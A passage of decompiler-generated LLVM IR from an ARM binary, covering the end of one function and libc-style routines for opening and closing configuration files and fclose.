  store i1 %v10_15e68, i1* %cpsr_z.global-to-local, align 1
  %v2_15e6c = xor i1 %v9_15e68, %v8_15e68
  br i1 %v2_15e6c, label %dec_label_pc_15d9c, label %dec_label_pc_15e70

dec_label_pc_15e70:                               ; preds = %dec_label_pc_15e60, %dec_label_pc_15e50, %bb72, %dec_label_pc_15d7c
  %v0_15e74 = phi i32 [ %v0_15d94, %dec_label_pc_15d7c ], [ %v2_15dac, %dec_label_pc_15e60 ], [ %v1_15e50, %dec_label_pc_15e50 ], [ %v2_15dac, %bb72 ]
  store i32 %v3_15b94, i32* %r2.global-to-local, align 4
  %v9_15e74 = icmp eq i32 %v0_15e74, %v3_15b94
  store i1 %v9_15e74, i1* %cpsr_z.global-to-local, align 1
  %v6_15e78 = icmp slt i32 %v0_15e74, %v3_15b94
  br i1 %v6_15e78, label %dec_label_pc_15e7c, label %dec_label_pc_15e88

dec_label_pc_15e7c:                               ; preds = %dec_label_pc_15e70
  %v0_15e7c = load i32, i32* @r8, align 4
  %v1_15e7c = and i32 %v0_15e7c, 1048576
  %v2_15e7c = icmp eq i32 %v1_15e7c, 0
  store i1 %v2_15e7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15e7c, label %dec_label_pc_15bd4.backedge, label %dec_label_pc_15e84

dec_label_pc_15e84:                               ; preds = %dec_label_pc_15e7c, %dec_label_pc_15d3c, %.thread, %entry
  br label %dec_label_pc_15e88

dec_label_pc_15e88:                               ; preds = %dec_label_pc_15e70, %dec_label_pc_15c58, %dec_label_pc_15e84
  %v0_15e88 = phi i32 [ %v0_15c68, %dec_label_pc_15c58 ], [ 0, %dec_label_pc_15e84 ], [ %v0_15e74, %dec_label_pc_15e70 ]
  store i32 %v0_15e88, i32* %r0.global-to-local, align 4
  store i32 %v3_15b70, i32* @r4, align 4
  store i32 %v6_15b70, i32* @r5, align 4
  store i32 %v9_15b70, i32* @r6, align 4
  store i32 %v12_15b70, i32* @r7, align 4
  store i32 %v15_15b70, i32* @r8, align 4
  store i32 %v18_15b70, i32* @sb, align 4
  store i32 %v21_15b70, i32* @sl, align 4
  store i32 %v24_15b70, i32* @fp, align 4
  ret i32 %v0_15e88

; uselistorder directives
  uselistorder i32 %v0_15e88, { 1, 0 }
  uselistorder i32 %v0_15e74, { 0, 2, 1 }
  uselistorder i32 %v3_15e68, { 1, 0 }
  uselistorder i32 %v2_15e68, { 1, 0, 2 }
  uselistorder i32 %v2_15dac, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_15e54.pre, { 0, 2, 1 }
  uselistorder i32 %v5_15de8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15d94, { 1, 0, 2 }
  uselistorder i1 %v9_15d74, { 1, 0 }
  uselistorder i32 %v3_15d4c, { 0, 2, 1, 3 }
  uselistorder i1 %v7_15d3c, { 1, 0 }
  uselistorder i1 %v8_15d34, { 1, 0 }
  uselistorder i32 %v3_15d04, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_15cf4, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v5_15cdc, { 1, 0, 2 }
  uselistorder i32 %v1_15ccc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15cb8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_15cb0, { 1, 0 }
  uselistorder i32 %v1_15c9c, { 1, 0 }
  uselistorder i32 %v1_15c98, { 1, 0 }
  uselistorder i32 %v2_15c74, { 1, 0 }
  uselistorder i32 %v1_15c58, { 2, 0, 1 }
  uselistorder i32 %v0_15c40, { 1, 0 }
  uselistorder i32 %v1_15c30, { 0, 2, 1 }
  uselistorder i32* %v1_15da0, { 1, 0 }
  uselistorder i1 %v2_15d48, { 1, 0, 2, 3 }
  uselistorder i32 %v1_15bbc, { 2, 0, 1, 3 }
  uselistorder i32 %v1_15bb0, { 2, 1, 0 }
  uselistorder i32 %v3_15b98, { 1, 2, 0 }
  uselistorder i32 %v3_15b94, { 2, 1, 0 }
  uselistorder i32 %v1_15b8c, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 8, 3, 4, 5, 6, 7, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 27, 26, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 12, 13, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i32 (i32*, i32, i32, i32)* @realloc, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 (i8*)* @strlen, { 1, 0 }
  uselistorder i32 %arg3, { 2, 3, 1, 5, 0, 4, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_15e88, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15e70, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_15e60, { 1, 0 }
  uselistorder label %dec_label_pc_15e50, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15e04, { 1, 0 }
  uselistorder label %dec_label_pc_15bd4.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15d64, { 1, 0 }
  uselistorder label %dec_label_pc_15d3c, { 1, 0 }
  uselistorder label %dec_label_pc_15d30, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15cf4, { 1, 0 }
  uselistorder label %dec_label_pc_15c28, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_15e9c = icmp eq i32* %arg1, null
  br i1 %v2_15e9c, label %dec_label_pc_15ec4, label %dec_label_pc_15ea4

dec_label_pc_15ea4:                               ; preds = %entry
  %v2_15ea4 = load i32, i32* %arg1, align 4
  %v1_15ea8 = inttoptr i32 %v2_15ea4 to i16*
  %v2_15ea8 = call i32 @__GI_fclose(i16* %v1_15ea8)
  %v0_15eac = load i32, i32* @r4, align 4
  %v1_15eac = add i32 %v0_15eac, 20
  %v2_15eac = inttoptr i32 %v1_15eac to i32*
  %v3_15eac = load i32, i32* %v2_15eac, align 4
  %v2_15eb0 = icmp eq i32 %v3_15eac, 0
  br i1 %v2_15eb0, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_15ea4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_15ea4, %bb
  store i32 89788, i32* @lr, align 4
  %v1_15eb8 = xor i1 %v2_15eb0, true
  call void @__pseudo_cond_branch(i1 %v1_15eb8, i32 ptrtoint (i32* @global_var_1358c.34 to i32))
  %v0_15ebc = load i32, i32* @r4, align 4
  store i32 %v0_15ebc, i32* @r0, align 4
  %v0_15ec0 = call i32 @free()
  br label %dec_label_pc_15ec4

dec_label_pc_15ec4:                               ; preds = %entry, %bb6
  %v1_15ec8 = phi i32 [ 0, %entry ], [ %v0_15ec0, %bb6 ]
  ret i32 %v1_15ec8

; uselistorder directives
  uselistorder label %dec_label_pc_15ec4, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15ed8 = load i32, i32* @r4, align 4
  store i32 %v3_15ed8, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 -33972), i32* @r1, align 4
  %v0_15ee0 = call i32 @__GI_fopen()
  store i32 %v0_15ee0, i32* %r0.global-to-local, align 4
  store i32 %v0_15ee0, i32* @r4, align 4
  %v2_15ee4 = icmp eq i32 %v0_15ee0, 0
  br i1 %v2_15ee4, label %bb, label %dec_label_pc_15ef0

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_15ef0:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_15ef8 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_15ef8, i32* %r0.global-to-local, align 4
  %v2_15efc = icmp eq i32 %v2_15ef8, 0
  br i1 %v2_15efc, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_15ef0
  %v1_15f00 = load i32, i32* @r4, align 4
  %v3_15f00 = inttoptr i32 %v2_15ef8 to i32*
  store i32 %v1_15f00, i32* %v3_15f00, align 4
  %v1_15f08.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_15ef0, %bb4
  %v1_15f08 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_15ef0 ], [ %v1_15f08.pre, %bb4 ]
  %v2_15f04 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15f04, i32* @r4, align 4
  ret i32 %v1_15f08

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 41, 38, 39, 40, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 1, 0, 26, 25, 24, 23, 3, 2, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_15f14 = load i32, i32* @r4, align 4
  store i32 %v3_15f14, i32* %stack_var_-36, align 4
  %v6_15f14 = load i32, i32* @r5, align 4
  %v9_15f14 = load i32, i32* @r6, align 4
  %v12_15f14 = load i32, i32* @r7, align 4
  %v2_15f18 = add i32 %tmp, 52
  %v3_15f18 = inttoptr i32 %v2_15f18 to i32*
  %v4_15f18 = load i32, i32* %v3_15f18, align 4
  store i32 %v4_15f18, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f20 = icmp eq i32 %v4_15f18, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* @r8, align 4
  br i1 %v2_15f20, label %dec_label_pc_15f34, label %dec_label_pc_15f98

dec_label_pc_15f34:                               ; preds = %entry
  %v0_15f34 = call i32 @__aeabi_read_tp()
  store i32 %v0_15f34, i32* %r0.global-to-local, align 4
  %v0_15f38 = load i32, i32* @r5, align 4
  %v1_15f38 = add i32 %v0_15f38, 64
  %v2_15f38 = inttoptr i32 %v1_15f38 to i32*
  %v3_15f38 = load i32, i32* %v2_15f38, align 4
  store i32 %v3_15f38, i32* %r3.global-to-local, align 4
  %v1_15f3c = add i32 %v0_15f34, -1168
  store i32 %v1_15f3c, i32* @r6, align 4
  %v3_15f40 = icmp uge i32 %v3_15f38, %v1_15f3c
  store i1 %v3_15f40, i1* %cpsr_c.global-to-local, align 1
  %v9_15f40 = icmp eq i32 %v3_15f38, %v1_15f3c
  br i1 %v9_15f40, label %dec_label_pc_15f8c, label %dec_label_pc_15f48

dec_label_pc_15f48:                               ; preds = %dec_label_pc_15f34
  %v1_15f48 = add i32 %v0_15f38, 56
  store i32 %v1_15f48, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_15f48, i32* %r2.global-to-local, align 4
  %v0_15f54 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_15f54, i32* @r4, align 4
  %v1_15f58115 = inttoptr i32 %v1_15f48 to i32*
  %v2_15f58116 = load i32, i32* %v1_15f58115, align 4
  store i32 %v2_15f58116, i32* %r3.global-to-local, align 4
  %v3_15f5c118 = icmp uge i32 %v2_15f58116, %v0_15f54
  store i1 %v3_15f5c118, i1* %cpsr_c.global-to-local, align 1
  %v9_15f5c124 = icmp eq i32 %v2_15f58116, %v0_15f54
  br i1 %v9_15f5c124, label %dec_label_pc_15f64, label %dec_label_pc_15f7c

dec_label_pc_15f64:                               ; preds = %dec_label_pc_15f48, %dec_label_pc_15f64.dec_label_pc_15f58_crit_edge
  %v0_15f64125 = phi i32 [ %v1_15f5c.pre, %dec_label_pc_15f64.dec_label_pc_15f58_crit_edge ], [ %v0_15f54, %dec_label_pc_15f48 ]
  store i32 %v0_15f64125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15f74 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15f74, label %dec_label_pc_15f78, label %dec_label_pc_15f64.dec_label_pc_15f58_crit_edge

dec_label_pc_15f64.dec_label_pc_15f58_crit_edge:  ; preds = %dec_label_pc_15f64
  %v0_15f58.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15f5c.pre = load i32, i32* @r4, align 4
  %v1_15f58 = inttoptr i32 %v0_15f58.pre to i32*
  %v2_15f58 = load i32, i32* %v1_15f58, align 4
  store i32 %v2_15f58, i32* %r3.global-to-local, align 4
  %v3_15f5c = icmp uge i32 %v2_15f58, %v1_15f5c.pre
  store i1 %v3_15f5c, i1* %cpsr_c.global-to-local, align 1
  %v9_15f5c = icmp eq i32 %v2_15f58, %v1_15f5c.pre
  br i1 %v9_15f5c, label %dec_label_pc_15f64, label %dec_label_pc_15f7c

dec_label_pc_15f78:                               ; preds = %dec_label_pc_15f64
  %v0_15f78 = load i32, i32* @r4, align 4
  store i32 %v0_15f78, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15f7c

dec_label_pc_15f7c:                               ; preds = %dec_label_pc_15f48, %dec_label_pc_15f64.dec_label_pc_15f58_crit_edge, %dec_label_pc_15f78
  %v0_15f7c = phi i32 [ %v0_15f78, %dec_label_pc_15f78 ], [ %v2_15f58116, %dec_label_pc_15f48 ], [ %v2_15f58, %dec_label_pc_15f64.dec_label_pc_15f58_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f7c = icmp eq i32 %v0_15f7c, 0
  br i1 %v2_15f7c, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_15f7c
  %v1_15f80 = load i32, i32* @r7, align 4
  store i32 %v1_15f80, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_15f7c, %bb
  %v1_15f84 = xor i1 %v2_15f7c, true
  call void @__pseudo_cond_branch(i1 %v1_15f84, i32 ptrtoint (i32* @global_var_14744.525 to i32))
  %v0_15f88 = load i32, i32* @r6, align 4
  %v1_15f88 = load i32, i32* @r5, align 4
  %v2_15f88 = add i32 %v1_15f88, 64
  %v3_15f88 = inttoptr i32 %v2_15f88 to i32*
  store i32 %v0_15f88, i32* %v3_15f88, align 4
  %v0_15f8c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15f8c

dec_label_pc_15f8c:                               ; preds = %dec_label_pc_15f34, %bb41
  %v0_15f8c = phi i32 [ %v0_15f38, %dec_label_pc_15f34 ], [ %v0_15f8c.pre, %bb41 ]
  %v1_15f8c = add i32 %v0_15f8c, 60
  %v2_15f8c = inttoptr i32 %v1_15f8c to i32*
  %v3_15f8c = load i32, i32* %v2_15f8c, align 4
  %v1_15f90 = add i32 %v3_15f8c, 1
  store i32 %v1_15f90, i32* %r3.global-to-local, align 4
  store i32 %v1_15f90, i32* %v2_15f8c, align 4
  %v0_15f98.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15f98

dec_label_pc_15f98:                               ; preds = %entry, %dec_label_pc_15f8c
  %v1_15fa0 = phi i32 [ %tmp, %entry ], [ %v0_15f98.pre, %dec_label_pc_15f8c ]
  %v1_15f98 = inttoptr i32 %v1_15fa0 to i16*
  %v2_15f98 = load i16, i16* %v1_15f98, align 2
  %v3_15f98 = zext i16 %v2_15f98 to i32
  store i32 %v3_15f98, i32* %r3.global-to-local, align 4
  %v1_15f9c = and i32 %v3_15f98, 64
  %v2_15f9c = icmp eq i32 %v1_15f9c, 0
  br i1 %v2_15f9c, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_15f98
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_15f98, %bb42
  %storemerge = phi i32 [ %v1_15fa0, %bb42 ], [ %v1_15f9c, %dec_label_pc_15f98 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 90024, i32* @lr, align 4
  %v1_15fa4 = xor i1 %v2_15f9c, true
  call void @__pseudo_cond_branch(i1 %v1_15fa4, i32 ptrtoint (i32* @global_var_16de8.617 to i32))
  %v0_15fa8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15fa8, i32* %fp.global-to-local, align 4
  %v0_15fac = load i32, i32* @r5, align 4
  %v1_15fac = add i32 %v0_15fac, 4
  %v2_15fac = inttoptr i32 %v1_15fac to i32*
  %v3_15fac = load i32, i32* %v2_15fac, align 4
  store i32 %v3_15fac, i32* %r0.global-to-local, align 4
  %v1_15fb0 = call i32 @__GI___libc_close(i32 %v3_15fac)
  store i32 %v1_15fb0, i32* %r0.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15fb8 = load i32, i32* @r8, align 4
  %v2_15fb8 = add i32 %v0_15fb8, 160
  %v3_15fb8 = inttoptr i32 %v2_15fb8 to i32*
  %v4_15fb8 = load i32, i32* %v3_15fb8, align 4
  store i32 %v4_15fb8, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_15fbc = icmp slt i32 %v1_15fb0, 0
  br i1 %v1_15fbc, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_15fc4 = add i32 %v4_15fb8, 8
  %v2_15fc4 = inttoptr i32 %v1_15fc4 to i32*
  %v3_15fc4 = load i32, i32* %v2_15fc4, align 4
  store i32 %v3_15fc4, i32* %r3.global-to-local, align 4
  %v0_15fc8 = call i32 @__aeabi_read_tp()
  store i32 %v0_15fc8, i32* %r0.global-to-local, align 4
  %v1_15fcc = add i32 %v0_15fc8, -1168
  store i32 %v1_15fcc, i32* %sl.global-to-local, align 4
  %v0_15fd0 = load i32, i32* %r3.global-to-local, align 4
  %v3_15fd0 = icmp uge i32 %v0_15fd0, %v1_15fcc
  store i1 %v3_15fd0, i1* %cpsr_c.global-to-local, align 1
  %v9_15fd0 = icmp eq i32 %v0_15fd0, %v1_15fcc
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_15fd8 = load i32, i32* @r5, align 4
  %v2_15fd8 = add i32 %v1_15fd8, 4
  %v3_15fd8 = inttoptr i32 %v2_15fd8 to i32*
  store i32 -1, i32* %v3_15fd8, align 4
  br i1 %v9_15fd0, label %dec_label_pc_16020, label %dec_label_pc_15fe0

dec_label_pc_15fe0:                               ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_15fe4 = load i32, i32* @r7, align 4
  store i32 %v0_15fe4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_15fec108 = inttoptr i32 %v0_15fe4 to i32*
  %v2_15fec109 = load i32, i32* %v1_15fec108, align 4
  store i32 %v2_15fec109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15ff0111 = icmp eq i32 %v2_15fec109, 0
  br i1 %v9_15ff0111, label %dec_label_pc_15ff8, label %dec_label_pc_16010

dec_label_pc_15ff8:                               ; preds = %dec_label_pc_15fe0, %dec_label_pc_15ff8.dec_label_pc_15fec_crit_edge
  %v0_15ff8112 = phi i32 [ %v1_15ff0.pre, %dec_label_pc_15ff8.dec_label_pc_15fec_crit_edge ], [ 0, %dec_label_pc_15fe0 ]
  store i32 %v0_15ff8112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16008 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16008, label %dec_label_pc_1600c, label %dec_label_pc_15ff8.dec_label_pc_15fec_crit_edge

dec_label_pc_15ff8.dec_label_pc_15fec_crit_edge:  ; preds = %dec_label_pc_15ff8
  %v0_15fec.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15ff0.pre = load i32, i32* @r4, align 4
  %v1_15fec = inttoptr i32 %v0_15fec.pre to i32*
  %v2_15fec = load i32, i32* %v1_15fec, align 4
  store i32 %v2_15fec, i32* %r3.global-to-local, align 4
  %v3_15ff0 = icmp uge i32 %v2_15fec, %v1_15ff0.pre
  store i1 %v3_15ff0, i1* %cpsr_c.global-to-local, align 1
  %v9_15ff0 = icmp eq i32 %v2_15fec, %v1_15ff0.pre
  br i1 %v9_15ff0, label %dec_label_pc_15ff8, label %dec_label_pc_16010

dec_label_pc_1600c:                               ; preds = %dec_label_pc_15ff8
  %v0_1600c = load i32, i32* @r4, align 4
  store i32 %v0_1600c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16010

dec_label_pc_16010:                               ; preds = %dec_label_pc_15fe0, %dec_label_pc_15ff8.dec_label_pc_15fec_crit_edge, %dec_label_pc_1600c
  %v0_16010 = phi i32 [ %v0_1600c, %dec_label_pc_1600c ], [ %v2_15fec109, %dec_label_pc_15fe0 ], [ %v2_15fec, %dec_label_pc_15ff8.dec_label_pc_15fec_crit_edge ]
  %v1_16010 = phi i32 [ %v0_1600c, %dec_label_pc_1600c ], [ 0, %dec_label_pc_15fe0 ], [ %v1_15ff0.pre, %dec_label_pc_15ff8.dec_label_pc_15fec_crit_edge ]
  %v3_16010 = icmp uge i32 %v0_16010, %v1_16010
  store i1 %v3_16010, i1* %cpsr_c.global-to-local, align 1
  %v9_16010 = icmp eq i32 %v0_16010, %v1_16010
  br i1 %v9_16010, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_16010
  %v1_16014 = load i32, i32* @r7, align 4
  store i32 %v1_16014, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_16010, %bb46
  %v1_16018 = xor i1 %v9_16010, true
  call void @__pseudo_cond_branch(i1 %v1_16018, i32 ptrtoint (i32* @global_var_14744.525 to i32))
  %v0_1601c = load i32, i32* %sl.global-to-local, align 4
  %v1_1601c = load i32, i32* @r7, align 4
  %v2_1601c = add i32 %v1_1601c, 8
  %v3_1601c = inttoptr i32 %v2_1601c to i32*
  store i32 %v0_1601c, i32* %v3_1601c, align 4
  br label %dec_label_pc_16020

dec_label_pc_16020:                               ; preds = %bb45, %bb47
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16024 = load i32, i32* @r8, align 4
  %v2_16024 = add i32 %v0_16024, 160
  %v3_16024 = inttoptr i32 %v2_16024 to i32*
  %v4_16024 = load i32, i32* %v3_16024, align 4
  store i32 %v4_16024, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1602c = add i32 %v0_16024, 12
  %v3_1602c = inttoptr i32 %v2_1602c to i32*
  %v4_1602c = load i32, i32* %v3_1602c, align 4
  store i32 %v4_1602c, i32* %r2.global-to-local, align 4
  %v1_16030 = add i32 %v4_16024, 4
  %v2_16030 = inttoptr i32 %v1_16030 to i32*
  %v3_16030 = load i32, i32* %v2_16030, align 4
  store i32 %v3_16030, i32* %r1.global-to-local, align 4
  %v1_16034 = inttoptr i32 %v4_1602c to i32*
  %v2_16034 = load i32, i32* %v1_16034, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16038 = icmp eq i32 %v3_16030, 0
  %v1_1603c = add i32 %v2_16034, 1
  store i32 %v1_1603c, i32* %r3.global-to-local, align 4
  store i32 %v1_1603c, i32* %v1_16034, align 4
  br i1 %v2_16038, label %dec_label_pc_16048, label %dec_label_pc_160a8

dec_label_pc_16048:                               ; preds = %dec_label_pc_16020
  %v0_16048 = load i32, i32* %r1.global-to-local, align 4
  %v1_16048 = load i32, i32* %r0.global-to-local, align 4
  %v2_16048 = add i32 %v1_16048, 8
  %v3_16048 = inttoptr i32 %v2_16048 to i32*
  store i32 %v0_16048, i32* %v3_16048, align 4
  %v0_1604c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1604c, i32* @r7, align 4
  br label %dec_label_pc_16050

dec_label_pc_16050:                               ; preds = %dec_label_pc_16080.dec_label_pc_16050_crit_edge, %dec_label_pc_16048
  %v0_16050 = phi i32 [ %v0_16050.pre, %dec_label_pc_16080.dec_label_pc_16050_crit_edge ], [ %v0_1604c, %dec_label_pc_16048 ]
  %v1_16050 = inttoptr i32 %v0_16050 to i32*
  %v2_16050 = load i32, i32* %v1_16050, align 4
  store i32 %v2_16050, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16050, i32* %r2.global-to-local, align 4
  %v2_1605c96 = load i32, i32* %v1_16050, align 4
  store i32 %v2_1605c96, i32* %r3.global-to-local, align 4
  %v3_1606098 = icmp uge i32 %v2_1605c96, %v2_16050
  store i1 %v3_1606098, i1* %cpsr_c.global-to-local, align 1
  %v9_16060104 = icmp eq i32 %v2_1605c96, %v2_16050
  br i1 %v9_16060104, label %dec_label_pc_16068, label %dec_label_pc_16080

dec_label_pc_16068:                               ; preds = %dec_label_pc_16050, %dec_label_pc_16068.dec_label_pc_1605c_crit_edge
  %v0_16068105 = phi i32 [ %v1_16060.pre, %dec_label_pc_16068.dec_label_pc_1605c_crit_edge ], [ %v2_16050, %dec_label_pc_16050 ]
  store i32 %v0_16068105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16078 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16078, label %dec_label_pc_1607c, label %dec_label_pc_16068.dec_label_pc_1605c_crit_edge

dec_label_pc_16068.dec_label_pc_1605c_crit_edge:  ; preds = %dec_label_pc_16068
  %v0_1605c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16060.pre = load i32, i32* @r4, align 4
  %v1_1605c = inttoptr i32 %v0_1605c.pre to i32*
  %v2_1605c = load i32, i32* %v1_1605c, align 4
  store i32 %v2_1605c, i32* %r3.global-to-local, align 4
  %v3_16060 = icmp uge i32 %v2_1605c, %v1_16060.pre
  store i1 %v3_16060, i1* %cpsr_c.global-to-local, align 1
  %v9_16060 = icmp eq i32 %v2_1605c, %v1_16060.pre
  br i1 %v9_16060, label %dec_label_pc_16068, label %dec_label_pc_16080

dec_label_pc_1607c:                               ; preds = %dec_label_pc_16068
  %v0_1607c = load i32, i32* @r4, align 4
  store i32 %v0_1607c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16080

dec_label_pc_16080:                               ; preds = %dec_label_pc_16050, %dec_label_pc_16068.dec_label_pc_1605c_crit_edge, %dec_label_pc_1607c
  %v0_16088 = phi i32 [ %v0_1607c, %dec_label_pc_1607c ], [ %v2_1605c96, %dec_label_pc_16050 ], [ %v2_1605c, %dec_label_pc_16068.dec_label_pc_1605c_crit_edge ]
  %v1_16080 = phi i32 [ %v0_1607c, %dec_label_pc_1607c ], [ %v2_16050, %dec_label_pc_16050 ], [ %v1_16060.pre, %dec_label_pc_16068.dec_label_pc_1605c_crit_edge ]
  %v3_16080 = icmp uge i32 %v0_16088, %v1_16080
  store i1 %v3_16080, i1* %cpsr_c.global-to-local, align 1
  %v9_16080 = icmp eq i32 %v0_16088, %v1_16080
  br i1 %v9_16080, label %dec_label_pc_16088, label %dec_label_pc_16080.dec_label_pc_16050_crit_edge

dec_label_pc_16080.dec_label_pc_16050_crit_edge:  ; preds = %dec_label_pc_16080
  %v0_16050.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16050

dec_label_pc_16088:                               ; preds = %dec_label_pc_16080
  %v2_16088 = icmp ne i32 %v1_16080, 0
  store i1 %v2_16088, i1* %cpsr_c.global-to-local, align 1
  %v7_1608c = icmp slt i32 %v1_16080, 2
  br i1 %v7_1608c, label %dec_label_pc_160a8, label %dec_label_pc_16090

dec_label_pc_16090:                               ; preds = %dec_label_pc_16088
  %v0_16090 = load i32, i32* @r7, align 4
  store i32 %v0_16090, i32* %r0.global-to-local, align 4
  %v0_16094 = load i32, i32* %r1.global-to-local, align 4
  %v1_16094 = add i32 %v0_16094, 129
  store i32 %v1_16094, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_160a8

dec_label_pc_160a8:                               ; preds = %dec_label_pc_16020, %dec_label_pc_16090, %dec_label_pc_16088
  %v0_160a8 = load i32, i32* @r5, align 4
  %v1_160a8 = inttoptr i32 %v0_160a8 to i16*
  %v2_160a8 = load i16, i16* %v1_160a8, align 2
  %v3_160a8 = zext i16 %v2_160a8 to i32
